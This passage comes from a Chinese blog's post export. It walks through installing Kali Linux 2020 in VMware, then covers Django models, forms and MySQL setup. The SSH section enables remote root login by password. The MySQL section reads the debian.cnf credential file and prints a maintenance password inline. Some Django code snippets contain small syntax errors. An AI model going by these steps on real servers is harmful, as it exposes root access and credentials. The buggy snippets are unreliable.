64位`\n\n![](https://i.loli.net/2020/04/14/KfU9BqhYZ23JWGR.png)\n\n**step5：**填写虚拟机的名字，以及虚拟机的安装位置\n\n![](https://i.loli.net/2020/04/14/VKUY9xqwBTJ8kSh.png)\n\n**step6：**配置处理器,装好后可以修改\n\n![](https://i.loli.net/2020/04/14/5Z4U1pFyXLBb2cR.png)\n\n**step7：**配置内存\n\n![](https://i.loli.net/2020/04/14/YSMhlCZwRveu1Kc.png)\n\n**step8：**配置网络连接方式\n\n![](https://i.loli.net/2020/04/14/BkhrTysU1tJDGZw.png)\n\n**step9：**以下几步默认选项，直接下一步\n\n![](https://i.loli.net/2020/04/14/lB1rqiJ3a6c7Dop.png)\n\n![](https://i.loli.net/2020/04/14/i5VNKWnd6vBmXLP.png)\n\n![](https://i.loli.net/2020/04/14/TfIV7a4tpqONYlX.png)\n\n**step10：**设置磁盘的容量，默认是20G，并存储为单个文件\n\n![](https://i.loli.net/2020/04/14/dL6Gqeojh3isSJ5.png)\n\n**step11：**直接下一步\n\n![](https://i.loli.net/2020/04/14/vxEzRQtBU2Ljpgq.png)\n\n**step12：**点击自定义硬件\n\n![](https://i.loli.net/2020/04/14/czwXDQHrpaNOhP8.png)\n\n**step13：**编辑虚拟机的CD/DVD,选择你下载的`kali 2020`的镜像\n\n![](https://i.loli.net/2020/04/14/eqYfrsURyh26vVE.png)\n\n**step14：**再点击完成\n\n![](https://i.loli.net/2020/04/14/fYb1zRLZVDmAjdp.png)\n\n### 安装Kali-2020\n\n**step1：**点击\"开启此虚拟机\"\n\n**step2：**选择图形界面安装\n\n![](https://i.loli.net/2020/04/14/vpPrBquSiz7EkxH.png)\n\n**step3：**选择语言、区域、键盘\n\n![](https://i.loli.net/2020/04/14/QxsfyKicp82eVHl.png)\n\n![](https://i.loli.net/2020/04/14/zQBEVv4SjTypIkb.png)\n\n![](https://i.loli.net/2020/04/14/WNqgGxnhuypaF4H.png)\n\n**step4：**配置网络--输入主机名，域名可以为空\n\n![](https://i.loli.net/2020/04/14/OCQXxfL7wSK1iRG.png)\n\n![](https://i.loli.net/2020/04/14/b46jfEgGYvrDZRN.png)\n\n**step5：**创建一个非root权限的普通用户，然后输入密码\n\n![](https://i.loli.net/2020/04/14/cRBdHPlaUnkChKi.png)\n\n![](https://i.loli.net/2020/04/14/cR8m7oQ1fPK4nFs.png)\n\n![](https://i.loli.net/2020/04/14/aOzujvXNIY85JSr.png)\n**step6：**磁盘分区，推荐使用默认的配置\n\n![](https://i.loli.net/2020/04/14/puxBYAG5qbvO2i3.png)\n\n<img src=\"https://i.loli.net/2020/04/14/IqwrK9tO2dMxPyC.png\"/>\n\n![](https://i.loli.net/2020/04/14/BrXx5NfZ2RelDwF.png)\n\n![](https://i.loli.net/2020/04/14/VSaovWglKuEsxZ8.png)\n\n**step7：**将改动写入磁盘，选择“是”。之后安装系统时间比较长，耐心等待；\n\n![](https://i.loli.net/2020/04/14/jRf7qPLeQoNzhgd.png)\n\n**step8：**直接点继续\n\n![](https://i.loli.net/2020/04/14/lEbuUkaRYdgnDiJ.png)\n\n**step9：**是否使用网络镜像，选择否！因为我们已经使用自己下好镜像文件\n\n![](https://i.loli.net/2020/04/14/sNpgiczwG9h5v38.png)\n\n**step10：**根据自己的需要，选择要安装的软件，之后就是漫长的等待\n\n![](../images/Kali-2020%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20200414103205857.png)\n\n**step11：**将GRUB安装到硬盘\n\n![image-20200414104255252](https://i.loli.net/2020/04/14/6dqDJMyRP5bHi2A.png)\n\n![image-20200414104313343](https://i.loli.net/2020/04/14/BpKth1ceajNALW2.png)\n\n**step12：**安装完毕后，重启系统即可\n\n<img src=\"https://i.loli.net/2020/04/14/qLYAIVaHGtPzh1m.png\" alt=\"image-20200414104358935\"  />\n\n**step12：**用你创建的用户登录，root用户还没设密码无法登陆\n\n![image-20200414104459206.png](https://i.loli.net/2020/04/14/pWGN1snuyEmdSfr.png)\n\n**ok**,到这你就成功安装kali-2020啦\n\n![image-20200414104524321](https://i.loli.net/2020/04/14/pRAqhzVPfCMyd5H.png)\n\n## 安装VMtools\n\n>  VMware Tools是虚拟机和物理机交换数据的一个强大工具，可以让虚拟机自适应窗口大小，以及物理机和虚拟机之间的复制、粘贴操作等，能够更方便我们使用虚拟机的操作系统\n\n1.点击菜单栏虚拟机>安装VMware Tools\n\n2.终端输入命令`df -h`确定是否已经挂载\n\n![image-20200414110436650](https://i.loli.net/2020/04/14/pNcD4uYBVtWRGCQ.png)\n\n3.进入挂载的目录下\n\n```bash\ncd /media/cdrom0\n```\n\n![image-20200414110915474](https://i.loli.net/2020/04/14/e81pFzJfCErtiRH.png)\n\n4.拷贝到用户根目录下\n\n```bash\ncp VMwareTools-10.3.10-13959562.tar.gz /home/jwt\n```\n\n<img src=\"https://i.loli.net/2020/04/14/qAa9DnF7VmztwBC.png\" alt=\"image-20200414111423063\"  />\n\n5.解压文件\n\n```bash\ntar -zxvf VMwaretools(tab补齐）\n```\n\n6.运行文件\n\n```bash\ncd /home/jwt\ncd vmware-tools-distrib/\n\nsudo ./vmware-install.pl \n#一定要加sudo出现的选项，默认就好(回车)\n```\n\n![image-20200414112438468.png](https://i.loli.net/2020/04/14/awoxyGQc8pFhuAe.png)\n\n出现如下说明安装成功\n\n![image-20200414112545324](https://i.loli.net/2020/04/14/A9b8BVtfGWKrCQO.png)\n\n6.删除安装包\n\n```bash\nrm VMwareTools-10.3.10-13959562.tar.gz \nrm -r vmware-tools-distrib/\n```\n\n7.重启\n\n```bash\nsudo reboot\n```\n\n## 设置root用户的密码\n\n没设root密码之前,非root用户无法切换到root\n\n```bash\nsudo passwd root\n```\n\n#先输你自己安装时非root用户密码，再输的就是root密码，然后再次输入root密码。这样就给root用户设置了密码。\n\n```bash1\nsu root \n```\n\n输入刚才设root密码就能切换到root用户了！\n\n## 修改源\n\n> 从国内的代理站点下载软件速度要快很多\n\n```\nsudo vim /etc/apt/sources.list\n```\n\n在最下面添加上就行，我用的是阿里源\n\n```\n#阿里云\ndeb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n\n#中科大\ndeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n\n#清华大学\ndeb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\ndeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n\n```\n\n更新仓库目录及软件\n\n```bash\nsu root\n\nsudo apt update && apt upgrade && apt dist-upgrade\n```\n\n## 安装Gnome桌面\n\n```bash\nsudo apt-get install gnome-core kali-defaults kali-root-login desktop-base\n\n#安装美化工具gnome-tweak-tool\nsudo apt-get install gnome-tweak-tool\nsudo apt install gnome-shell-extensions\n\n# 安装dash to dock 任务栏美化\nsudo apt-get install gnome-shell-extension-dashtodock   \n```\n\n## 安装谷歌输入法\n\n```bash\napt-get install fcitx\n\nsudo apt --fix-broken install\n\napt-get install fcitx-googlepinyin\n\nim-config #选择fcitx\n\nreboot\n```\n\n## 安装谷歌浏览器\n\n```bash\n#安装谷歌浏览器\napt install chromium \n\n#安装中文包\nsudo apt-get install chromium-l10n\n\n#重启\nreboot\n```\n\n## 配置sshd服务实现远程登录\n\n```bash\n#打开配置文件\n$ sudo vim /etc/ssh/sshd_config\n\n#修改配置文件\n将 #PermitRootLogin prohibit-password 修改为 PermitRootLogin yes\n\n#重启服务\n$ /etc/init.d/ssh restart\n\n#检查是否重启成功 显示0表示重启成功\n$ echo $?\n0 \n\n#检查22端口是否运行\n$ sudo lsof -i :22\nCOMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nsshd    17077 root    3u  IPv4 218681      0t0  TCP *:ssh (LISTEN)\nsshd    17077 root    4u  IPv6 218683      0t0  TCP *:ssh (LISTEN)\n\n#配置开机启动ssh\n$ sudo update-rc.d ssh enable\n\n#远程链接\n$ ssh 用户名@ip\n```\n\n## 修改家目录为英文\n\n**方法1：**\n\n```bash\n打开终端，在终端中输入命令:\nexport LANG=en_US\nxdg-user-dirs-gtk-update\n跳出对话框询问是否将目录转化为英文路径,同意并关闭.\n\n\n在终端中输入命令:\nexport LANG=zh_CN\n关闭终端,并重起.下次进入系统,系统会提示是否把转化好的目录改回中文.选择不再提示,并取消修改.主目录的中文转英文就完成了.\n```\n\n**方法2：**\n\n```bash\nsudo vim ~/.config/user-dirs.dirs\n\n将如下\nXDG_DESKTOP_DIR=\"$HOME/桌面\"\nXDG_DOWNLOAD_DIR=\"$HOME/下载\"\nXDG_TEMPLATES_DIR=\"$HOME/模板\"\nXDG_PUBLICSHARE_DIR=\"$HOME/公共\"\nXDG_DOCUMENTS_DIR=\"$HOME/文档\"\nXDG_MUSIC_DIR=\"$HOME/音乐\"\nXDG_PICTURES_DIR=\"$HOME/图片\"\nXDG_VIDEOS_DIR=\"$HOME/视频\"\n\n修改为如下，然后保存重启即可\nXDG_DESKTOP_DIR=\"$HOME/Desktop\"\nXDG_DOWNLOAD_DIR=\"$HOME/Downloads\"\nXDG_TEMPLATES_DIR=\"$HOME/Templates\"\nXDG_PUBLICSHARE_DIR=\"$HOME/Public\"\nXDG_DOCUMENTS_DIR=\"$HOME/Documents\"\nXDG_MUSIC_DIR=\"$HOME/Music\"\nXDG_PICTURES_DIR=\"$HOME/Pictures\"\nXDG_VIDEOS_DIR=\"$HOME/Videos\"\n```\n\n","tags":["Kali"],"categories":["Tools"]},{"title":"Python：Django框架","url":"/posts/60439.html","content":"> Django 是一个高级 Python Web 框架，鼓励快速开发和干净、实用的设计。由经验丰富的开发人员构建，它负责处理 Web 开发的大部分麻烦，因此您可以专注于编写应用，而无需重新发明轮子。它是自由和开源的。\n\n## 一、基础知识准备\n\n### 1 学习路线和环境\n\n> 操作系统：Ubantu 18.04 \n> 编程工具：PyCharm 2019.3.4 \n> 环        境：python 3.6 + Django 3.0.5\n\n<img src=\"https://img.jwt1399.top//img/20201204102601.png\" alt=\"Django项目开发学习路线\" width=\"400\" height=\"600\"/>\n\n###  2 Django-MVT架构\n\n`Models `：负责与数据库交互\n`Views`：负责接收请求、获取数据、返回结果\n`Templates`：负责呈现内容到浏览器\n\n![](https://img.jwt1399.top//img/20201204102640.png)\n\n### 3 Django-目录结构\n\n![Django-目录结构](https://img.jwt1399.top//img/20201204103302.png)\n\n## 二、构建项目\n\n### 1）Linux 构建项目\n\n#### 1 创建虚拟环境\n\n创建项目是要先进入创建的虚拟环境中\n\n> 虚拟环境让每一个Python项目有独立的运行环境,具体使用方法请看我另外一篇文章[Python虚拟环境](https://jwt1399.top/posts/26224.html)\n>\n> 因此最后使用python虚拟环境\n\n```bash\nmkvirtualenv -p python3 my_django #创建名为my_django的虚拟环境\n\npip3 install Djiango #下载Django 如果下载失败请将pip更换为国内源\n```\n#### 2 创建项目\n\n```python\ndjango-admin startproject <Project_Name> \n```\n让我们看看 `startproject `创建了些什么:\n\n![初始项目结构](https://img.jwt1399.top//img/20201204103338.png)\n\n- `manage.py `：一种命令行工具，允许你以多种方式与该 Django 项目进行交互。 键入python manage.py help，看一下它能做什么。 你应当不需要编辑这个文件；在这个目录下生成它纯是为了方便。\n- `__init__.py `：让 Python 把该目录当成一个开发包 (即一组模块)所需的文件。 这是一个空文件，一般你不需要修改它。\n- `settings.py `：该 Django 项目的设置或配置。 查看并理解这个文件中可用的设置类型及其默认值。\n- `urls.py`：Django项目的URL设置。 可视其为你的django网站的目录。 \n\n#### 3 创建APP\n\n```python\npython manage.py startapp <App_Name>\n```\n> Note:创建app时，必须在项目目录下、\n#### 4 运行Django服务器\n\n```bash\npython manage.py runserver\n```\n\n看到下面页面表示项目创建成功：\n\n![第一次成功运行界面](https://img.jwt1399.top//img/20201204103155.png)\n\n#### 5 总结\n\n![总结](https://img.jwt1399.top//img/20201204103224.png)\n\n### 2）Windows构建项目\n\n> 虚拟环境让每一个Python项目有独立的运行环境,具体使用方法请看我另外一篇文章[Python虚拟环境](https://jwt1399.top/posts/26224.html)\n>\n> 因此最后使用python虚拟环境\n\n#### 创建虚拟环境：bug\n\n```bash\nmkvirtualenv -p python3 bug\n\npip3 install django  #如果下载失败请将pip更换为国内源\n或者指定下载对应版本\npip3 install django==3.0.5  \n\n#查看Django版本\ndjango-admin --version\n```\n\n![](../images/Django-bug%E9%A1%B9%E7%9B%AE/image-20200417100352149.png)\n\n#### 创建django项目：bug\n\n![创建django项目](../images/Django-bug%E9%A1%B9%E7%9B%AE/image-20200417100628433.png)\n\n#### 选择项目解释器: bug\n\n![选择项目解释器](https://img.jwt1399.top//img/20201204103736.png)\n\n### 3）PyCharm构建项目\n\n可以使用PyCharm直接一步到位，但是还是要了解上方命令构建的方式\n\n![](https://img.jwt1399.top//img/20201204103642.png)\n\n有可能创建之后，没有自动帮你选好解释器(虚拟环境)，你可以自己到设置中配置\n\n![选择项目解释器](../images/Django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/UXYfWjABkEragq3.png)\n\n## 三、本地配置\n\n> 本地配置local_settings会重写默认settings中的配置\n\n### 1 在setting中写入\n\n```python\ntry:\n    from .local_settings import *\nexcept ImportError:\n    pass\n```\n\n### 2 创建自己的本地配置\n\n```python\n# local_setting.py\nLANGUAGE_CODE = 'zh-hans'\n\nTIME_ZONE = 'Asia/Shanghai'\n\n```\n\n注意：给别人代码时不要给local_setting,里面包含个人的配置\n\n## 四、URL\n\n### path()语法\n\n`path(<route>,<view>,[name,**kwargs])`\n\n`route` :，必选，表示url路径,从URL的端口后面开始匹配。\n`view` :必选，表示route匹配成功后，需要调用的视图，view必须是个函数,也可以使用类视图，但需要使用as_view(）函数。\n`name` :可选，为url指定一个别名。\n`**kwags` :可选，可以传递额外的参数---字典。\n\n> 特别说明：django2.1之前使用的是url()，它使用的是正则，如果你仍然想使用正则表达式在你的route中，你可以使用re_path()，它的用法也path基本完全相同，只是在 配置route时，你需要使用正则表达式的方式。\n\n```python\nfrom django.urls import path\nfrom . import views\n\nurlpatterns = [\n    path(route='index/',view=views.index,name='index',{'foo':'bar'}),\n   \n    path('index/', views.index,name='index'),#可以这样简写\n]\n```\n\n## 五、View\n\n在 Django 中，视图(view)对 WEB 请求进行回应，视图就是一个 Python 函数，被定义在 `views.py` 中\n视图接收 reqeust 对象作为第一个参数，包含了请求的信息\n\n```python\nfrom django.http import HttpResponse\n    def index(request):\n          return HttpResponse(\"Hello World!\")\n```\n\n说明：\n第二行引入 HttpResponse，它是用来向网页返回内容。\n\n1. index()函数第一个参数必须是 request，与网页发来的请求有关，request 变量里面包含 get 或 post 的内容，用户浏览器，系统等信息在里面 。\n2. 函数返回了一个 HttpResponse 对象，最终显示几个字到网页上。\n\n**使用render方式渲染模板**\n\n```python\nfrom django.shortcuts import render\n\n# 导入数据模型ArticlePost\nfrom .models import ArticlePost\n\ndef article_list(request):\n    # 取出所有博客文章\n    articles = ArticlePost.objects.all()\n    # 需要传递给模板（templates）的对象\n    context = { 'articles': articles }\n    # render函数：载入模板，并返回context对象\n    return render(request, 'article/list.html', context)\n```\n\n分析如下：\n\n- `from .models import ArticlePost`从`models.py`中导入`ArticlePost`数据类\n- `ArticlePost.objects.all()`是数据类的方法，可以获得所有的对象（即博客文章），并传递给`articles`变量\n- `context`定义了需要传递给**模板**的上下文，这里即`articles`\n\n- 最后返回了`render`函数。它的作用是结合模板和上下文，并返回渲染后的HttpResponse对象。通俗的讲就是把context的内容，加载进模板，并通过浏览器呈现。\n\n`render`的变量分解如下：\n\n- request是固定的`request`对象，照着写就可以\n- `article/list.html`定义了模板文件的位置、名称\n- `context`定义了需要传入模板文件的上下文\n\n视图函数这样就写好了。\n\n## 六、Model\n\n###  Field 类型\n\n| 属性                       | 描述                                                         |\n| -------------------------- | ------------------------------------------------------------ |\n| AutoField                  | 一个自动增长的IntegerField，一般不直接使用，Django会自动给每张表添加一个自增的primary key |\n| **BooleanField**           | True/False，默认的widget 是 CheckboxInput。                  |\n| BinaryField                | 存储二进制数据。不能使用 filter 函数获得 QuerySet            |\n| BigIntegerField            | 64位整数                                                     |\n| **CharField**              | **存储字符串。必须有max_length参数指定长度**                 |\n| CommaSeparatedIntegerField | 一串由逗号分开的整数。必须有 max_length 参数                 |\n| DateField                  | 日期                                                         |\n| DateField.auto_now         | 每次执行自动记录当前时间，常作为最近一次修改的时间使用       |\n| DateField.auto_now_add     | 第一次创建的时候添加当前时间，常作为创建时间使用             |\n| DateTimeField              | 日期+时间 常用附加选项和DateField一样。                      |\n| DecimalField               | 双精度浮点数                                                 |\n| **EmailField**             | **加上邮件地址合法性验证的CharField，不需要强制设定 max_length** |\n| FileField                  | 文件上传，不支持 primary_key 和 unique，否则会报 TypeError 异常。 |\n| FloatField                 | float 单精度浮点数                                           |\n| ImageField                 | 加上图片合法性验证功能的FileField，需要安装 PIL 或者 Pillow 模块 |\n| **IntegerField**           | 整数，默认的组件是TextInput。                                |\n| IPAddressField             | IP地址，字符串类型，如 127.0.0.1。默认组件是 TextInput。     |\n| **TextField**              | **大文本，巨长的文本。默认的组件是Textarea**                 |\n| **URLField**               | 加了 URL 合法性验证的 CharField。                            |\n\n### Field 选项\n\n| 选项             | 描述                                                         |\n| ---------------- | ------------------------------------------------------------ |\n| null             | boolean 值，默认为false。TURE=将NULL空值存储到数据库中       |\n| **blank**        | boolean 值，该字段是否可以为空。如果为假，则必须有值。       |\n| choices          | 元组值，一个用来选择值的2维元组。第一个值是实际存储的值，第二个用来方便进行选择。如SEX_CHOICES=((‘F’,’Female’),(‘M’,’Male’),) |\n| db_column        | string 值，指定当前列在数据库中的名字，不设置，将自动采用model字段名 |\n| db_index         | boolean 值，如果为True将为此字段创建索引                     |\n| **default**      | **给当前字段设置默认值**                                     |\n| editable         | boolean 值，如果为false，admin模式下将不能改写。默认为true   |\n| error_messages   | 字典，设置默认的出错信息                                     |\n| help_text        | admin模式下帮助文档，组件内显示帮助文本。                    |\n| **primary_key**  | **设置当前字段为主键，如果没有设置主键django创建表时会自动id主键** |\n| radio_admin      | 用于 admin 模式下将 select 转换为 radio 显示。               |\n| unique           | boolean值，True=该字段的值必须唯一                           |\n| **verbose_name** | **string类型。设置该字段的另一个名字**                       |\n| validators       | 有效性检查。无效则抛出 django.core.validators.ValidationError 异常。 |\n\n### 使用实例\n\n在`models.py`中创建\n\n```python\nclass Articles(models.Model):\n    title = models.CharField(verbose_name='标题',max_length=20)\n    author = models.CharField(verbose_name='作者',max_length=20)\n    content = models.TextField(verbose_name='内容')\n    def __str__(self): #以title显示\n        return self.title\n\nclass UserInfo(models.Model):\n    choice = [('male','男'),('female','女')]\n    username = models.CharField(verbose_name='用户名', max_length=32)\n    mobile_phone = models.CharField(verbose_name='手机号', max_length=32)\n    password = models.CharField(verbose_name='密码', max_length=32)\n    sex=models.CharField(verbose_name='性别',choices=choice,default='male',max_length=32)\n```\n\n在admin.py中注册\n\n```python\nfrom .models import Articles\nadmin.site.register(Articles)\n\nfrom .models import UserInfo\nclass StudentsAdmin(admin.ModelAdmin):\n    list_display = ['username','mobile_phone','password','sex']\nadmin.site.register(UserInfo,StudentsAdmin)\n```\n\n生成迁移文件并映射，Django会根据指定的数据库自动生成sql语句\n\n```bash\npython manage.py makemigrations\n\npython manage.py migrate\n```\n\n创建后台用户，创建了才可以登录后台\n\n```bash\npython manage.py createsuperuser\n```\n\n登录后台(127.0.0.1:8000/admin)就能看到创建的Articles和UserInfo\n\n![](https://img.jwt1399.top//img/20201204103821.png)\n\n### Meta元数据\n\n|                     属性                      |                 描述                 |\n| :-------------------------------------------: | :----------------------------------: |\n|               db_table = 'xxx'                |            修改表名为xxx             |\n|               ordering  = 'xxx'               |         按照指定字段xxx排序          |\n|             verbose_name = 'xxx'              |  设置模型对象的可读的名称，单数名字  |\n|      verbose_name_plural = verbose_name       |     设置verbose_name的复数名名字     |\n|                abstract = True                |         设置模型类为一个基类         |\n| permissions = (('定义好的权限', '权限说明'),) |      给数据库的表设置额外的权限      |\n|                managed = False                | 是否按照django既定的规则来管理模型类 |\n|     unique_together = ('address', 'note')     |           联合唯一键，约束           |\n|               app_label = 'xxx'               |       定义模型类属于哪一个应用       |\n|                 db_tablespace                 |        定义数据库表空间的名字        |\n\nMeta作为模型的子类 注意缩进\n\n```python\nclass UserInfo(models.Model):\n    choice = [('male','男'),('female','女')]\n    username = models.CharField(verbose_name='用户名', max_length=32)\n\n    class Meta:\n        verbose_name_plural=verbose_name = '信息'  #将User Infos在后台显示为信息\n        ordering = ['id','username'] #以id和username排序 #逆序排的话加个‘-’ eg: -id\n        db_table = 'students' #修改表明为students，默认名为app名_类名\n```\n\n![](https://img.jwt1399.top//img/20201204103843.png)\n\n## 七、Form\n\n### Forms字段基本语法\n\n> `Field(required=True, widget=None, label=None, initial=None,help_text='', error_messages=None, show_hidden_initial=False,validators=(),localize=False, disabled=False, label_suffix=None)`\n>\n> required: 指定字段是否必填\n> widget : 字段控件\n> label : 字段在html中显示的标签\n> initial : 初始在字段中显示的值\n> help_text: 在字段后面显示定义的帮助文档\n> error_messages : 是一个字典，错误提示信息\n> show_hidden_initial : 显示或隐藏初始值\n> validators : 表单验证规则\n> localize : 是否支持本地化\n> disabled : 是否可用\n> label_suffix : 重写标签的属性后缀\n\n### Field类型\n\n> 所有的字段都继承自Field对象。\n\n- CharField\n```\nCharField(max_length=None, min_length=None, strip=True, empty_value='', **kwargs)\n```\n- IntegerField\n```\nIntegerField(max_value=None, min_value=None, **kwargs)\n```\n- BaseTemporalField\n```\nBaseTemporalField(BaseTemporalField)\n```\n- DurationField\n```\nDurationField()\n```\n- FileField\n```\nFileField(max_length=None, allow_empty_file=False, **kwargs)\n```\n- BooleanField\n```\nBooleanField()\n```\n- ChoiceField\n```\nChoiceField(choices=(),**kwargs)\n```\n- ComboField\n```\nComboField(fields,**kwargs)\n```\n- MultiValueField\n```\nMultiValueField(fields, *, require_all_fields=True, **kwargs)\n```\n### 继承自Field类型\n\n#### 继续自CharField的字段\n\n- RegexField\n```\nRegexField(regex, **kwargs)\n```\n- EmailField\n```\nEmailField(**kwargs)\n```\n- URLField\n```\nURLField(**kwargs)\n```\n- GenericIPAddressField\n```\nGenericIPAddressField(protocol='both', unpack_ipv4=False, **kwargs)\n```\n- SlugField\n```\nSlugField(allow_unicode=False, **kwargs)\n```\n- UUIDField\n```\nUUIDField()\n```\n#### 继承自IntegerField的字段\n\n- FloatField\n```\nFloatField()\n```\n- DecimalField\n```\nDecimalField(max_value=None, min_value=None, max_digits=None, decimal_places=None, **kwargs)\n```\n#### 继承自BaseTemporalField的字段\n\n- TimeField\n```\nTimeField()\n```\n- DateTimeField\n```\nDateTimeField()\n```\n#### 继承自FileField的字段\n\n- ImageField\n```\nImageField()\n```\n#### 继承自BooleanField的字段\n\n- NullBooleanField\n```\nNullBooleanField()\n```\n#### 继承自ChoiceField的字段\n\n- TypedChoiceField\n```\nTypedChoiceField(coerce=lambda val: val, empty_value='', **kwargs)\n```\n- MultipleChoiceField\n```\nMultipleChoiceField()\n```\n- FilePathField\n```\nFilePathField(path, *, match=None, recursive=False, allow_files=True,\n                 allow_folders=False, **kwargs)\n```\n#### 继承自ChoiceField的字段\n\n- TypedMultipleChoiceField\n```\nTypedMultipleChoiceField(coerce=lambda val: val, **kwargs)\n```\n### widget表单控件\n\n每个Filed字段都有一个默认的widget类型。如果你想要使用一个不同的Widget，可以在定义字段时使用widget参数。 像这样：\n\n```python\nfrom django import forms\n \nclass RegisterForms(forms.Form):\n\tpassword = forms.CharField(widget=forms.PasswordInput)\n```\n\n| 控件                | 描述                                  |\n| ------------------- | ------------------------------------- |\n| TextInput           | 对应HTML中的`<input type=\"text\"/>`    |\n| NumberInput         | 数字输入框(为TextInput加数字验证)     |\n| EmailInput          | 邮箱输入框(为TextInput加邮箱格式验证) |\n| URLInput            | url输入框                             |\n| PasswordInput       | 密码输入框                            |\n| HiddenInput         | 隐藏输入框                            |\n| Textarea            | 文本区输入框                          |\n| DateInput           | 日期输入框                            |\n| DateTimeInut        | 日期时间输入框                        |\n| TimeInput           | 时间输入框                            |\n| SplitDateTimeWidget | 时间分割框(两个input框)               |\n| RadioSelect         | 单选框                                |\n| CheckboxInput       | 复选框                                |\n| Select              | 单选下拉框   等价ChoiceField          |\n| SelectMultiple      | 多选下拉框   等价MultipleChoiceField  |\n| FileInput           | 文件上传                              |\n| ClearableFileInput  | 多文件上传                            |\n\n### Form输出选项\n\n\n- {{ form.as_table }}：以表格形式加载表单元素\n\n- {{ form.as_p }}：以段落形式加载表单元素\n\n- {{ form.as_ul }}：以列表形式加载表单元素\n\n### 使用实例\n\n**在`app`中新建`forms.py`,并添加**\n\n```python\nfrom django import forms\nclass RegisterForms(forms.Form):\n    username = forms.CharField(min_length=4,max_length=10,label='用户名')\n    password = forms.CharField(min_length=4,max_length=10,label='密码',widget=forms.PasswordInput)\n    age = forms.IntegerField(label='年龄',min_value=1,max_value=120)\n    email = forms.EmailField(label='邮箱')\n    phone = forms.CharField(min_length=11, max_length=11,label='手机')\n```\n\n在`view.py`添加\n\n```python\nfrom .forms import RegisterForms\nfrom django.views import View\nclass IndexForms(View):\n    def get(self,request):\n        forms = RegisterForms()\n        return render(request,'index.html',{'forms':forms})\n```\n\n在`url.py`中添加\n\n```python\npath('forms/', views.IndexForms.as_view(),name='forms'),\n```\n\n在`templates`中新建`index.html`,并添加\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Forms</title>\n</head>\n<body>\n<!--渲染成表格-->\n<form action=\"\" method=\"post\">\n    <table>\n        {{ forms.as_table }}\n    </table>\n    <input type=\"submit\" value=\"提交\">\n</form>\n\n<hr>\n<!--渲染成段落-->\n<form action=\"\" method=\"post\">\n    {{ forms.as_p }}\n</form>\n\n<hr>\n<!--渲染成标签-->\n<form action=\"\" method=\"post\">\n{{ forms.as_ul }}\n</form>\n</body>\n</html>\n```\n\n![Forms实例](https://img.jwt1399.top//img/20201204103931.png)\n\n### 单选、复选、下拉列表\n\n在`forms.py`中添加\n\n```python\nfrom django import forms\nclass SexChoiceForms(forms.Form):\n    choices_item=[(1,'男'),(2,'女'),(3,'秘密')] \n    sex1 = forms.ChoiceField(label='性别',choices=choices_item,initial=1)#下拉列表\n    sex2 = forms.ChoiceField(label='性别', choices=choices_item,widget=forms.RadioSelect,initial=1)#单选框\n    sex3 = forms.ChoiceField(label='性别', choices=choices_item,widget=forms.CheckboxSelectMultiple,initial=1)#多选框\n    sex4 = forms.MultipleChoiceField(label='性别', choices=choices_item,initial=1)#多选框\n    sex5 = forms.ChoiceField(label='性别', choices=choices_item,initial=1,widget=forms.Select)#下拉列表\n    sex6 = forms.ChoiceField(label='性别', choices=choices_item, initial=1, widget=forms.SelectMultiple)#多选框\n```\n\n其他配置同上\n\n![单选、复选、下拉列表](https://img.jwt1399.top//img/20201204104011.png)\n\n### Postman安装\n\n打开官网直接下载，下载后进入下载目录解压\n\n```bash\ntar -zxvf Postman-linux-x64-7.22.1.tar.gz         \n```\n\n然后拷贝到`opt`目录下,并运行\n\n```bash\n sudo cp Postman /opt/ -r \n cd /opt/Postman\n ./Postman\n```\n\n创建软连接\n\n```python\nsudo ln -s /opt/Postman/Postman /usr/bin/postman\n```\n\n创建快捷方式,创建完就能在菜单找到Postman了\n\n```bash\n$ cat > ~/.local/share/applications/postman.desktop << EOL\nheredoc> [Desktop Entry]\nheredoc> Encoding=UTF-8                           \nheredoc> Name=Postman\nheredoc> Exec=postman\nheredoc> Icon=/opt/Postman/app/resources/app/assets/icon.png\nheredoc> Terminal=false\nheredoc> Type=Application\nheredoc> Categories=Development;\nheredoc> EOL\n```\n\n##  八、ModelForm\n\n在`forms.py`中添加\n\n```python\nclass ForbsForms(forms.ModelForm)\n\tclass Meta:\n        model = Forbs\n        fields = '__all__'\n```\n\n在`views.py`中添加\n\n```python\nclass Indexforbs(view):\n    def get(self,request):\n        forms = ForbsForms()\n        return render(request,'index.html',{'forms':forms}\n```\n\n在`urls.py`中添加\n\n```python\npath('',view.IndexForbs.as_view(),name='forbs')\n```\n\n给ModelForm加入css样式\n\n```python\npassword = forms.CharField(label='密码',widget=forms.PasswordInput(attrs={'class':\"form-control\",'placeholder':\"请输入密码\"}))\n```\n\n\n\n## 九、mysql数据库\n\n### linux安装\n\n```bash\nsudo apt-get install mysql-server #服务器\nsudo apt-get install mysql-client #客户端\n```\n\n### widows 安装\n\n请参考：[win10安装MySql教程](https://www.cnblogs.com/xiaokang01/p/12092160.html)\n\n### 使用\n\n```mysql\n#linux\nservice mysql start            #启动\nservice mysql  stop            #停止\nservice mysql restart          #重启\n\n#windows\ncd C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin #mysql默认安装目录\nnet start mysql80   #启动 我的服务器名称是MySQL80\nnet stop  mysql80   #停止\n#服务器名称查看：打开【控制面板】，选择【系统和安全】，然后选择【管理工具】，再选择【服务】,找到MySQL\n```\n\n### 连接\n\n```mysql\nsudo mysql -uroot -p \n#默认密码为空，回车就可以，如果不是root用户，必须加sudo,不加会报错，应该为还没设root密码，这是个坑点，下步设完就不加sudo\n```\n\n**如果密码不正确或忘记密码**\n\n```bash\ncat /etc/mysql/debian.cnf \n \t#user=debian-sys-maint\n\t#password=cwgoq56yTmCFvZBh\n\t#使用账号debian-sys-maint和对应的password值进行登录\n\t\nmysql -udebian-sys-maint -pcwgoq56yTmCFvZBh\n #成功登录进mysql,然后执行下面步骤↓修改root密码\n```\n\n### 设置数据库root密码\n\n```mysql\nupdate mysql.user set 